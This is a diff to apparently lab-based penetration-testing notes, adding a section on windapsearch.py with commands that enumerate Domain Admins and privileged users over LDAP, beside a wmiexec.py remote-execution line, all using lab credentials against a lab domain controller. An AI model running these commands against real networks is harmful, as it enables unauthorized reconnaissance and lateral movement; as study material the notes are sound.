@@ -36,4 +36,25 @@ wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5
 
 <figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
 
-##
+## Windapsearch.py
+
+* This is a tool that can be used to enumerate users, groups, and computers from a Windows admin by utilizing LDAP queries
+
+### Domain Admins
+
+Enumerate all Domain Admins:
+
+```
+python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da
+```
+
+### Privileged Users
+
+Enumerate all privileged users:
+
+```
+python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU
+```
+
+## BloodHound.py
+
